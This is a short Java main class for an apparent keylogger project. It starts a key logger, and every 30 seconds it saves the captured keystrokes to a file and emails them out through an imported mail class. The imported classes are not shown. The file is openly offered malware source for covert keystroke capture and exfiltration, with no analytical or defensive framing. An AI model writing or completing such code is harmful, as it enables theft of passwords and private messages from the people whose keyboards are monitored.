import Email.TextEmail;
import keylog.KeyLogger;

public class KeyloggerMain {
	public static void main(String[] args) {
		KeyLogger myKeylog = new KeyLogger();
		myKeylog.startKeyLogger();
		long start = System.currentTimeMillis();
		TextEmail MyMail = new TextEmail();
		while (true) {
			if (System.currentTimeMillis() - start == 30000) {
				KeyLogger.KeyBoard.SaveFile();
				System.out.println("Da Luu File ne");
				MyMail.SendMail();
				start = System.currentTimeMillis();
			}
		}
	}
}
